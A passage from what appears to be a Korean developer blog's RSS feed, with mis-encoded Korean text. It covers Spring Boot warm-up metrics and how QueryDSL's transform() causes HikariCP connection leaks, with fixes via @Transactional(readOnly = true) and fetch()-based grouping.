class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">incrementWarmUpSuccess</span><span class="params">(String taskName)</span> &#123;</span><br><span class="line">        Counter.builder(<span class="string">&quot;warmup.success&quot;</span>)</span><br><span class="line">            .tag(<span class="string">&quot;task&quot;</span>, taskName)</span><br><span class="line">            .register(meterRegistry)</span><br><span class="line">            .increment();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">incrementWarmUpFailure</span><span class="params">(String taskName)</span> &#123;</span><br><span class="line">        Counter.builder(<span class="string">&quot;warmup.failure&quot;</span>)</span><br><span class="line">            .tag(<span class="string">&quot;task&quot;</span>, taskName)</span><br><span class="line">            .register(meterRegistry)</span><br><span class="line">            .increment();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ê²°ë¡ "><a href="#ê²°ë¡ " class="headerlink" title="ê²°ë¡ "></a>ê²°ë¡ </h2><p>Spring Boot ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ Warm Upì€ ì´ˆê¸° ìš”ì²­ ì„±ëŠ¥ì„ ê°œì„ í•˜ê³  ì‚¬ìš©ì ê²½í—˜ì„ í–¥ìƒì‹œí‚¤ëŠ” ì¤‘ìš”í•œ ì‘ì—…ì…ë‹ˆë‹¤. íŠ¹íˆ Kubernetesì™€ ê°™ì€ ì»¨í…Œì´ë„ˆ ì˜¤ì¼€ìŠ¤íŠ¸ë ˆì´ì…˜ í™˜ê²½ì—ì„œëŠ” Probe ì„¤ì •ê³¼ í•¨ê»˜ ì ì ˆí•œ Warm Up ì „ëµì„ ìˆ˜ë¦½í•˜ëŠ” ê²ƒì´ í•„ìˆ˜ì ì…ë‹ˆë‹¤.</p><p>ì£¼ìš” í¬ì¸íŠ¸:</p><ul><li>JVMì˜ JIT ì»´íŒŒì¼, í´ë˜ìŠ¤ ë¡œë”©, ì»¤ë„¥ì…˜ í’€ ë“± ì´ˆê¸°í™” ë¹„ìš© ê³ ë ¤</li><li>ApplicationRunner, @PostConstruct ë“±ì„ í™œìš©í•œ ìë™í™”ëœ Warm Up</li><li>Kubernetesì—ì„œëŠ” Startup&#x2F;Readiness Probeì™€ í•¨ê»˜ ì‚¬ìš©</li><li>ì‹¤ì œ ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ì— ë§ëŠ” ì»¤ìŠ¤í…€ Warm Up ì „ëµ ìˆ˜ë¦½</li><li>ë©”íŠ¸ë¦­ ìˆ˜ì§‘ì„ í†µí•œ Warm Up íš¨ê³¼ ì¸¡ì • ë° ê°œì„ </li></ul><p>ì ì ˆí•œ Warm Up ì „ëµì„ í†µí•´ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ê°€ìš©ì„±ê³¼ ì„±ëŠ¥ì„ í¬ê²Œ í–¥ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Spring/">Spring</category>
      
      <category domain="https://ckck803.github.io/categories/Spring/Spring-Boot/">Spring Boot</category>
      
      
      
      <comments>https://ckck803.github.io/2025/12/25/spring/spring-boot-warmup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[QueryDSL] Transform ì‚¬ìš© ì‹œ HikariCP Connection Leak ë¬¸ì œ í•´ê²°</title>
      <link>https://ckck803.github.io/2025/12/25/spring/querydsl-transform-connection-leak/</link>
      <guid>https://ckck803.github.io/2025/12/25/spring/querydsl-transform-connection-leak/</guid>
      <pubDate>Wed, 24 Dec 2025 15:00:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;QueryDSL-Transform-ì‚¬ìš©-ì‹œ-HikariCP-Connection-Leak-ë¬¸ì œ&quot;&gt;&lt;a href=&quot;#QueryDSL-Transform-ì‚¬ìš©-ì‹œ-HikariCP-Connection-Leak-ë¬¸ì œ&quot; class=&quot;headerlink&quot; title=&quot;QueryDSL Transform ì‚¬ìš© ì‹œ HikariCP Connection Leak ë¬¸ì œ&quot;&gt;&lt;/a&gt;QueryDSL Transform ì‚¬ìš© ì‹œ HikariCP Connection Leak ë¬¸ì œ&lt;/h1&gt;&lt;p&gt;QueryDSLì˜ &lt;code&gt;transform()&lt;/code&gt; ë©”ì„œë“œëŠ” ì¿¼ë¦¬ ê²°ê³¼ë¥¼ ê·¸ë£¹í™”í•˜ê³  Mapìœ¼ë¡œ ë³€í™˜í•  ë•Œ ë§¤ìš° ìœ ìš©í•œ ê¸°ëŠ¥ì…ë‹ˆë‹¤. í•˜ì§€ë§Œ ë¶€ì ì ˆí•˜ê²Œ ì‚¬ìš©í•  ê²½ìš° ì‹¬ê°í•œ ë°ì´í„°ë² ì´ìŠ¤ ì»¤ë„¥ì…˜ ëˆ„ìˆ˜(Connection Leak)ë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;ë¬¸ì œ-ìƒí™©&quot;&gt;&lt;a href=&quot;#ë¬¸ì œ-ìƒí™©&quot; class=&quot;headerlink&quot; title=&quot;ë¬¸ì œ ìƒí™©&quot;&gt;&lt;/a&gt;ë¬¸ì œ ìƒí™©&lt;/h2&gt;&lt;p&gt;ìš´ì˜ ì¤‘ì¸ ì„œë¹„ìŠ¤ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì—ëŸ¬ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤:&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;HikariPool-1 - Connection is not available, request timed out after 30000ms.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;DB ì»¤ë„¥ì…˜ ìˆ˜ëŠ” POD ë‹¹ 20ê°œ(max-connection-pool) ë¡œ ì¶©ë¶„í•œ ìƒíƒœì˜€ê³ , íŠ¸ëœì­ì…˜ì´ ê¸¸ê²Œ ì¡íˆëŠ” ìŠ¬ë¡œìš° ì¿¼ë¦¬ë„ ì—†ëŠ” ìƒí™©ì´ë¼ ì•„ë¬´ë˜ë„ Connection Leak ì´ ë°œìƒí•˜ëŠ” ìƒí™©ì´ë¼ ìƒê° í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;ì›ì¸-ë¶„ì„&quot;&gt;&lt;a href=&quot;#ì›ì¸-ë¶„ì„&quot; class=&quot;headerlink&quot; title=&quot;ì›ì¸ ë¶„ì„&quot;&gt;&lt;/a&gt;ì›ì¸ ë¶„ì„&lt;/h2&gt;&lt;h3 id=&quot;QueryDSLì˜-transform-ë©”ì„œë“œ-íŠ¹ì§•&quot;&gt;&lt;a href=&quot;#QueryDSLì˜-transform-ë©”ì„œë“œ-íŠ¹ì§•&quot; class=&quot;headerlink&quot; title=&quot;QueryDSLì˜ transform() ë©”ì„œë“œ íŠ¹ì§•&quot;&gt;&lt;/a&gt;QueryDSLì˜ transform() ë©”ì„œë“œ íŠ¹ì§•&lt;/h3&gt;&lt;p&gt;ë¬¸ì œì˜ ì›ì¸ì€ QueryDSLì˜ &lt;code&gt;transform()&lt;/code&gt; ë©”ì„œë“œì˜ ë‚´ë¶€ ë™ì‘ ë°©ì‹ì— ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// ë¬¸ì œê°€ ë˜ëŠ” ì½”ë“œ ì˜ˆì‹œ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; Map&amp;lt;Long, List&amp;lt;OrderItem&amp;gt;&amp;gt; &lt;span class=&quot;title function_&quot;&gt;getOrderItemsByOrderId&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(List&amp;lt;Long&amp;gt; orderIds)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; queryFactory&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .selectFrom(orderItem)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .where(orderItem.orderId.in(orderIds))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .transform(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            groupBy(orderItem.orderId)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            .as(list(orderItem))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="QueryDSL-Transform-ì‚¬ìš©-ì‹œ-HikariCP-Connection-Leak-ë¬¸ì œ"><a href="#QueryDSL-Transform-ì‚¬ìš©-ì‹œ-HikariCP-Connection-Leak-ë¬¸ì œ" class="headerlink" title="QueryDSL Transform ì‚¬ìš© ì‹œ HikariCP Connection Leak ë¬¸ì œ"></a>QueryDSL Transform ì‚¬ìš© ì‹œ HikariCP Connection Leak ë¬¸ì œ</h1><p>QueryDSLì˜ <code>transform()</code> ë©”ì„œë“œëŠ” ì¿¼ë¦¬ ê²°ê³¼ë¥¼ ê·¸ë£¹í™”í•˜ê³  Mapìœ¼ë¡œ ë³€í™˜í•  ë•Œ ë§¤ìš° ìœ ìš©í•œ ê¸°ëŠ¥ì…ë‹ˆë‹¤. í•˜ì§€ë§Œ ë¶€ì ì ˆí•˜ê²Œ ì‚¬ìš©í•  ê²½ìš° ì‹¬ê°í•œ ë°ì´í„°ë² ì´ìŠ¤ ì»¤ë„¥ì…˜ ëˆ„ìˆ˜(Connection Leak)ë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="ë¬¸ì œ-ìƒí™©"><a href="#ë¬¸ì œ-ìƒí™©" class="headerlink" title="ë¬¸ì œ ìƒí™©"></a>ë¬¸ì œ ìƒí™©</h2><p>ìš´ì˜ ì¤‘ì¸ ì„œë¹„ìŠ¤ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì—ëŸ¬ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HikariPool-1 - Connection is not available, request timed out after 30000ms.</span><br></pre></td></tr></table></figure><p>DB ì»¤ë„¥ì…˜ ìˆ˜ëŠ” POD ë‹¹ 20ê°œ(max-connection-pool) ë¡œ ì¶©ë¶„í•œ ìƒíƒœì˜€ê³ , íŠ¸ëœì­ì…˜ì´ ê¸¸ê²Œ ì¡íˆëŠ” ìŠ¬ë¡œìš° ì¿¼ë¦¬ë„ ì—†ëŠ” ìƒí™©ì´ë¼ ì•„ë¬´ë˜ë„ Connection Leak ì´ ë°œìƒí•˜ëŠ” ìƒí™©ì´ë¼ ìƒê° í–ˆìŠµë‹ˆë‹¤.</p><h2 id="ì›ì¸-ë¶„ì„"><a href="#ì›ì¸-ë¶„ì„" class="headerlink" title="ì›ì¸ ë¶„ì„"></a>ì›ì¸ ë¶„ì„</h2><h3 id="QueryDSLì˜-transform-ë©”ì„œë“œ-íŠ¹ì§•"><a href="#QueryDSLì˜-transform-ë©”ì„œë“œ-íŠ¹ì§•" class="headerlink" title="QueryDSLì˜ transform() ë©”ì„œë“œ íŠ¹ì§•"></a>QueryDSLì˜ transform() ë©”ì„œë“œ íŠ¹ì§•</h3><p>ë¬¸ì œì˜ ì›ì¸ì€ QueryDSLì˜ <code>transform()</code> ë©”ì„œë“œì˜ ë‚´ë¶€ ë™ì‘ ë°©ì‹ì— ìˆì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ë¬¸ì œê°€ ë˜ëŠ” ì½”ë“œ ì˜ˆì‹œ</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;Long, List&lt;OrderItem&gt;&gt; <span class="title function_">getOrderItemsByOrderId</span><span class="params">(List&lt;Long&gt; orderIds)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> queryFactory</span><br><span class="line">        .selectFrom(orderItem)</span><br><span class="line">        .where(orderItem.orderId.in(orderIds))</span><br><span class="line">        .transform(</span><br><span class="line">            groupBy(orderItem.orderId)</span><br><span class="line">            .as(list(orderItem))</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì¼ë°˜ì ì¸ QueryDSL ì¢…ë£Œ ë©”ì„œë“œë“¤:</p><ul><li><code>fetch()</code> - ê²°ê³¼ ë¦¬ìŠ¤íŠ¸ ì¡°íšŒ</li><li><code>fetchOne()</code> - ë‹¨ì¼ ê²°ê³¼ ì¡°íšŒ</li><li><code>fetchFirst()</code> - ì²« ë²ˆì§¸ ê²°ê³¼ ì¡°íšŒ</li><li><code>fetchCount()</code> - ì¹´ìš´íŠ¸ ì¡°íšŒ</li></ul><p>ì´ ë©”ì„œë“œë“¤ì€ ëª¨ë‘ <code>queryTerminationMethods</code>ì— ë“±ë¡ë˜ì–´ ìˆì–´ <strong>ì¿¼ë¦¬ ì‹¤í–‰ í›„ ìë™ìœ¼ë¡œ ë¦¬ì†ŒìŠ¤ë¥¼ ì •ë¦¬</strong>í•©ë‹ˆë‹¤.</p><h3 id="transform-ì˜-ë‹¤ë¥¸-ì "><a href="#transform-ì˜-ë‹¤ë¥¸-ì " class="headerlink" title="transform()ì˜ ë‹¤ë¥¸ ì "></a>transform()ì˜ ë‹¤ë¥¸ ì </h3><p>í•˜ì§€ë§Œ <code>transform()</code> ë©”ì„œë“œëŠ”:</p><ol><li>ë‚´ë¶€ì ìœ¼ë¡œ <code>iterate()</code> ë©”ì„œë“œë¥¼ ì‚¬ìš©</li><li><code>iterate()</code>ëŠ” ì¿¼ë¦¬ ì¢…ë£Œ ë©”ì„œë“œê°€ ì•„ë‹˜</li><li>JPA EntityManagerê°€ <strong>ì»¤ë„¥ì…˜ì„ ìë™ìœ¼ë¡œ ë°˜í™˜í•˜ì§€ ì•ŠìŒ</strong></li><li>ë©”ì„œë“œ ì‹¤í–‰ì´ ëë‚˜ë„ ì»¤ë„¥ì…˜ì´ ê³„ì† ì ìœ ë¨</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// QueryDSL ë‚´ë¶€ ì½”ë“œ (ë‹¨ìˆœí™”)</span></span><br><span class="line"><span class="keyword">public</span> &lt;RT&gt; RT <span class="title function_">transform</span><span class="params">(ResultTransformer&lt;RT&gt; transformer)</span> &#123;</span><br><span class="line">    <span class="comment">// iterate()ë¥¼ ì‚¬ìš© - ì´ê²ƒì´ ë¬¸ì œ!</span></span><br><span class="line">    <span class="keyword">return</span> transformer.transform(<span class="built_in">this</span>.iterate());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ì»¤ë„¥ì…˜-ëˆ„ìˆ˜-ì‹œë‚˜ë¦¬ì˜¤"><a href="#ì»¤ë„¥ì…˜-ëˆ„ìˆ˜-ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ì»¤ë„¥ì…˜ ëˆ„ìˆ˜ ì‹œë‚˜ë¦¬ì˜¤"></a>ì»¤ë„¥ì…˜ ëˆ„ìˆ˜ ì‹œë‚˜ë¦¬ì˜¤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ìš”ì²­ 1] transform() í˜¸ì¶œ â†’ ì»¤ë„¥ì…˜ 1 íšë“ â†’ ì¿¼ë¦¬ ì‹¤í–‰ â†’ ì»¤ë„¥ì…˜ ë°˜í™˜ ì•ˆë¨ âŒ</span><br><span class="line">[ìš”ì²­ 2] transform() í˜¸ì¶œ â†’ ì»¤ë„¥ì…˜ 2 íšë“ â†’ ì¿¼ë¦¬ ì‹¤í–‰ â†’ ì»¤ë„¥ì…˜ ë°˜í™˜ ì•ˆë¨ âŒ</span><br><span class="line">[ìš”ì²­ 3] transform() í˜¸ì¶œ â†’ ì»¤ë„¥ì…˜ 3 íšë“ â†’ ì¿¼ë¦¬ ì‹¤í–‰ â†’ ì»¤ë„¥ì…˜ ë°˜í™˜ ì•ˆë¨ âŒ</span><br><span class="line">...</span><br><span class="line">[ìš”ì²­ N] transform() í˜¸ì¶œ â†’ ì‚¬ìš© ê°€ëŠ¥í•œ ì»¤ë„¥ì…˜ ì—†ìŒ â†’ 30ì´ˆ ëŒ€ê¸° â†’ íƒ€ì„ì•„ì›ƒ ğŸ’¥</span><br></pre></td></tr></table></figure><h2 id="í•´ê²°-ë°©ë²•"><a href="#í•´ê²°-ë°©ë²•" class="headerlink" title="í•´ê²° ë°©ë²•"></a>í•´ê²° ë°©ë²•</h2><h3 id="í•´ê²°ì±…-Transactional-readOnly-true-ì¶”ê°€"><a href="#í•´ê²°ì±…-Transactional-readOnly-true-ì¶”ê°€" class="headerlink" title="í•´ê²°ì±…: @Transactional(readOnly &#x3D; true) ì¶”ê°€"></a>í•´ê²°ì±…: @Transactional(readOnly &#x3D; true) ì¶”ê°€</h3><p>ê°€ì¥ ê°„ë‹¨í•˜ê³  í™•ì‹¤í•œ í•´ê²°ì±…ì€ <code>@Transactional</code> ì–´ë…¸í…Œì´ì…˜ì„ ì¶”ê°€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional(readOnly = true)</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;Long, List&lt;OrderItem&gt;&gt; <span class="title function_">getOrderItemsByOrderId</span><span class="params">(List&lt;Long&gt; orderIds)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> queryFactory</span><br><span class="line">        .selectFrom(orderItem)</span><br><span class="line">        .where(orderItem.orderId.in(orderIds))</span><br><span class="line">        .transform(</span><br><span class="line">            groupBy(orderItem.orderId)</span><br><span class="line">            .as(list(orderItem))</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ì™œ-Transactionalì´-ë¬¸ì œë¥¼-í•´ê²°í•˜ëŠ”ê°€"><a href="#ì™œ-Transactionalì´-ë¬¸ì œë¥¼-í•´ê²°í•˜ëŠ”ê°€" class="headerlink" title="ì™œ @Transactionalì´ ë¬¸ì œë¥¼ í•´ê²°í•˜ëŠ”ê°€?"></a>ì™œ @Transactionalì´ ë¬¸ì œë¥¼ í•´ê²°í•˜ëŠ”ê°€?</h3><p><code>@Transactional</code> ì–´ë…¸í…Œì´ì…˜ì„ ì¶”ê°€í•˜ë©´:</p><ol><li><p><strong>Springì˜ íŠ¸ëœì­ì…˜ ê´€ë¦¬ í™œì„±í™”</strong></p><ul><li><code>JpaTransactionManager</code>ê°€ ë©”ì„œë“œ ì‹¤í–‰ì„ ê´€ë¦¬</li></ul></li><li><p><strong>ë©”ì„œë“œ ì™„ë£Œ ì‹œ ì •ë¦¬ ì‘ì—… ë³´ì¥</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Spring íŠ¸ëœì­ì…˜ ë§¤ë‹ˆì €ì˜ ë‚´ë¶€ ë™ì‘ (ë‹¨ìˆœí™”)</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ ì‹¤í–‰</span></span><br><span class="line">    result = method.invoke();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// íŠ¸ëœì­ì…˜ ì»¤ë°‹</span></span><br><span class="line">    transactionManager.commit();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// ì •ë¦¬ ì‘ì—… - ì—¬ê¸°ì„œ ì»¤ë„¥ì…˜ ë°˜í™˜!</span></span><br><span class="line">    transactionManager.doCleanupAfterCompletion();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>EntityManagerì™€ ì»¤ë„¥ì…˜ í•´ì œ</strong></p><ul><li><code>doCleanupAfterCompletion()</code>ì—ì„œ ëª¨ë“  ë¦¬ì†ŒìŠ¤ ì •ë¦¬</li><li>EntityManager ë‹«ê¸°</li><li><strong>ë°ì´í„°ë² ì´ìŠ¤ ì»¤ë„¥ì…˜ì„ HikariCP í’€ì— ë°˜í™˜</strong></li></ul></li></ol><h3 id="readOnly-trueì˜-ì¶”ê°€-ì´ì "><a href="#readOnly-trueì˜-ì¶”ê°€-ì´ì " class="headerlink" title="readOnly &#x3D; trueì˜ ì¶”ê°€ ì´ì "></a>readOnly &#x3D; trueì˜ ì¶”ê°€ ì´ì </h3><p><code>@Transactional(readOnly = true)</code>ë¥¼ ì‚¬ìš©í•˜ë©´:</p><ol><li><p><strong>ì„±ëŠ¥ ìµœì í™”</strong></p><ul><li>Hibernateê°€ Dirty Checkingì„ í•˜ì§€ ì•ŠìŒ</li><li>ìŠ¤ëƒ…ìƒ· ì €ì¥ ì•ˆí•¨</li><li>í”ŒëŸ¬ì‹œ ëª¨ë“œë¥¼ <code>MANUAL</code>ë¡œ ì„¤ì •</li></ul></li><li><p><strong>ëª…í™•í•œ ì˜ë„ í‘œí˜„</strong></p><ul><li>ì´ ë©”ì„œë“œê°€ ì½ê¸° ì „ìš©ì„ì„ ëª…ì‹œ</li><li>ì‹¤ìˆ˜ë¡œ ë°ì´í„°ë¥¼ ìˆ˜ì •í•˜ëŠ” ê²ƒì„ ë°©ì§€</li></ul></li><li><p><strong>ë°ì´í„°ë² ì´ìŠ¤ ìµœì í™”</strong></p><ul><li>ì¼ë¶€ ë°ì´í„°ë² ì´ìŠ¤ëŠ” ì½ê¸° ì „ìš© íŠ¸ëœì­ì…˜ì„ ìµœì í™”</li><li>Read Replicaë¡œ ë¼ìš°íŒ… ê°€ëŠ¥ (ì„¤ì •ì— ë”°ë¼)</li></ul></li></ol><h2 id="ëŒ€ì•ˆì ì¸-í•´ê²°-ë°©ë²•"><a href="#ëŒ€ì•ˆì ì¸-í•´ê²°-ë°©ë²•" class="headerlink" title="ëŒ€ì•ˆì ì¸ í•´ê²° ë°©ë²•"></a>ëŒ€ì•ˆì ì¸ í•´ê²° ë°©ë²•</h2><h3 id="1-fetch-ë¡œ-ì¡°íšŒ-í›„-ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ-ê·¸ë£¹í™”"><a href="#1-fetch-ë¡œ-ì¡°íšŒ-í›„-ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ-ê·¸ë£¹í™”" class="headerlink" title="1. fetch()ë¡œ ì¡°íšŒ í›„ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ê·¸ë£¹í™”"></a>1. fetch()ë¡œ ì¡°íšŒ í›„ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ê·¸ë£¹í™”</h3><p>transform()ì„ ì‚¬ìš©í•˜ì§€ ì•Šê³  ì• í”Œë¦¬ì¼€ì´ì…˜ ë ˆë²¨ì—ì„œ ê·¸ë£¹í™”:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;Long, List&lt;OrderItem&gt;&gt; <span class="title function_">getOrderItemsByOrderId</span><span class="params">(List&lt;Long&gt; orderIds)</span> &#123;</span><br><span class="line">    List&lt;OrderItem&gt; items = queryFactory</span><br><span class="line">        .selectFrom(orderItem)</span><br><span class="line">        .where(orderItem.orderId.in(orderIds))</span><br><span class="line">        .fetch();  <span class="comment">// ì¼ë°˜ì ì¸ ì¢…ë£Œ ë©”ì„œë“œ ì‚¬ìš©</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Java Streamìœ¼ë¡œ ê·¸ë£¹í™”</span></span><br><span class="line">    <span class="keyword">return</span> items.stream()</span><br><span class="line">        .collect(Collectors.groupingBy(OrderItem::getOrderId));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ì¥ì :</strong></p><ul><li>ì»¤ë„¥ì…˜ ëˆ„ìˆ˜ ìœ„í—˜ ì—†ìŒ</li><li><code>@Transactional</code> ì—†ì´ë„ ì•ˆì „</li></ul><p><strong>ë‹¨ì :</strong></p><ul><li>ì• í”Œë¦¬ì¼€ì´ì…˜ ë©”ëª¨ë¦¬ì—ì„œ ê·¸ë£¹í™” ì²˜ë¦¬</li><li>ëŒ€ìš©ëŸ‰ ë°ì´í„°ì—ì„œëŠ” ë©”ëª¨ë¦¬ ë¶€ë‹´</li></ul><h3 id="2-ë„¤ì´í‹°ë¸Œ-ì¿¼ë¦¬-ì‚¬ìš©"><a href="#2-ë„¤ì´í‹°ë¸Œ-ì¿¼ë¦¬-ì‚¬ìš©" class="headerlink" title="2. ë„¤ì´í‹°ë¸Œ ì¿¼ë¦¬ ì‚¬ìš©"></a>2. ë„¤ì´í‹°ë¸Œ ì¿¼ë¦¬ ì‚¬ìš©</h3><p>ë³µì¡í•œ ê·¸ë£¹í™”ê°€ í•„ìš”í•œ ê²½ìš° ë„¤ì´í‹°ë¸Œ ì¿¼ë¦¬ ê³ ë ¤:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Query(value = &quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">    SELECT o.order_id, o.item_name, o.quantity</span></span><br><span class="line"><span class="meta">    FROM order_items o</span></span><br><span class="line"><span class="meta">    WHERE o.order_id IN :orderIds</span></span><br><span class="line"><span class="meta">    ORDER BY o.order_id</span></span><br><span class="line"><span class="meta">    &quot;&quot;&quot;, nativeQuery = true)</span></span><br><span class="line">List&lt;OrderItemProjection&gt; <span class="title function_">findOrderItemsByOrderIds</span><span class="params">(<span class="meta">@Param(&quot;orderIds&quot;)</span> List&lt;Long&gt; orderIds)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ê·¸ë£¹í™”</span></span><br><span class="line"><span class="keyword">return</span> items.stream()</span><br><span class="line">    .collect(Collectors.groupingBy(OrderItemProjection::getOrderId));</span><br></pre></td></tr></table></figure><h3 id="3-Projectionê³¼-Tuple-ì‚¬ìš©"><a href="#3-Projectionê³¼-Tuple-ì‚¬ìš©" class="headerlink" title="3. Projectionê³¼ Tuple ì‚¬ìš©"></a>3. Projectionê³¼ Tuple ì‚¬ìš©</h3><p>í•„ìš”í•œ ì»¬ëŸ¼ë§Œ ì¡°íšŒí•˜ì—¬ ë©”ëª¨ë¦¬ íš¨ìœ¨ì„± í–¥ìƒ:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional(readOnly = true)</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;Long, List&lt;OrderItemDto&gt;&gt; <span class="title function_">getOrderItemsByOrderId</span><span class="params">(List&lt;Long&gt; orderIds)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> queryFactory</span><br><span class="line">        .select(</span><br><span class="line">            orderItem.orderId,</span><br><span class="line">            orderItem.itemName,</span><br><span class="line">            orderItem.quantity</span><br><span class="line">        )</span><br><span class="line">        .from(orderItem)</span><br><span class="line">        .where(orderItem.orderId.in(orderIds))</span><br><span class="line">        .fetch()  <span class="comment">// fetch() ì‚¬ìš©</span></span><br><span class="line">        .stream()</span><br><span class="line">        .map(tuple -&gt; <span class="keyword">new</span> <span class="title class_">OrderItemDto</span>(</span><br><span class="line">            tuple.get(orderItem.orderId),</span><br><span class="line">            tuple.get(orderItem.itemName),</span><br><span class="line">            tuple.get(orderItem.quantity)</span><br><span class="line">        ))</span><br><span class="line">        .collect(Collectors.groupingBy(OrderItemDto::getOrderId));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ì‹¤ì „-ì˜ˆì‹œ-í™˜ë¶ˆ-ì²˜ë¦¬"><a href="#ì‹¤ì „-ì˜ˆì‹œ-í™˜ë¶ˆ-ì²˜ë¦¬" class="headerlink" title="ì‹¤ì „ ì˜ˆì‹œ: í™˜ë¶ˆ ì²˜ë¦¬"></a>ì‹¤ì „ ì˜ˆì‹œ: í™˜ë¶ˆ ì²˜ë¦¬</h2><p>ì‹¤ì œ í”„ë¡œë•ì…˜ í™˜ê²½ì—ì„œ ë°œìƒí–ˆë˜ í™˜ë¶ˆ ì²˜ë¦¬ ì½”ë“œë¥¼ ê°œì„ í•œ ì˜ˆì‹œì…ë‹ˆë‹¤.</p><h3 id="ë¬¸ì œê°€-ìˆë˜-ì½”ë“œ"><a href="#ë¬¸ì œê°€-ìˆë˜-ì½”ë“œ" class="headerlink" title="ë¬¸ì œê°€ ìˆë˜ ì½”ë“œ"></a>ë¬¸ì œê°€ ìˆë˜ ì½”ë“œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefundService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @Transactional ì—†ìŒ - ë¬¸ì œ ë°œìƒ!</span></span><br><span class="line">    <span class="keyword">public</span> <span 